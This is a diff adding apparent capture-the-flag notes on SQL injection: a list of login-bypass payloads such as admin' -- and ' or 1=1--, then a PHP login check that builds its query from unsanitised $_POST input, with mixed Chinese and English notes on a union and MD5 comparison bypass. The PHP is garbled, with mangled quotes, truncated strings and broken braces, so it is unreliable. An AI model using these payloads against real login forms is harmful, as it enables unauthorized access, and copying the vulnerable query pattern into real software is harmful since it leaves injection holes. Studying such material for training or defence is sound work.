@@ -1,0 +1,28 @@
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1--
+
+union MD5相等繞過
+
+if($_POST[user] && $_POST[pass]) { 。。。。 }
+
+$user = $_POST[user];
+
+$pass = md5($_POST[pass]);
+
+$sql = \pw from php where user='$user'\$query = mysql_query($sql); if (!$query) { exit(); }
+
+$row = mysql_fetch_array($query, MYSQL_ASSOC); //echo $row[\
+
+if (($row[pw]) && (!strcasecmp($pass, $row[pw]))) { echo \in! Key:**************
+
+\ }
+else {failure!} }
+
+漏洞点$sql = \pw from php where user='$user'\ 
+邏輯 first get the username and 根據 username check sql result to compare the password 然後將 輸入的pass 和username de result compare
